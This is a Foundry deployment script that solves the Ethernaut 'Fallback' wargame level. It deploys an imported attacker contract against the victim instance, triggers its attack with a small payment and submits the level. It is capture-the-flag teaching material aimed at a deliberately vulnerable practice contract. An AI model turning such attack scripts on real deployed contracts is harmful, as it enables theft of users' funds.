// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {FallbackAttacker} from "../../src/2-fallback/FallbackAttacker.sol";
import {Ethernaut} from "../../src/Ethernaut.sol";
import {Script} from "forge-std/Script.sol";

contract FallbackAttack is Script{
  function run() public{
    // Defining contract addresses
    address ethernautAddress = vm.envAddress("ETHERNAUT_CONTRACT_INSTANCE");
    address fallbackAddress = vm.envAddress("VICTIM_CONTRACT_INSTANCE");
    uint256 attacker = vm.envUint("PRIVATE_KEY");

    // Instantiating contracts
    Ethernaut ethernaut = Ethernaut(ethernautAddress);

    vm.startBroadcast(attacker);
    // deploy attacker contract
    FallbackAttacker fallbackAttacker = new FallbackAttacker(payable(fallbackAddress));

    // Attack
    fallbackAttacker.attack{value: 2}();

    // Submit level instance
    ethernaut.submitLevelInstance(payable(fallbackAddress));

    vm.stopBroadcast();
  }
}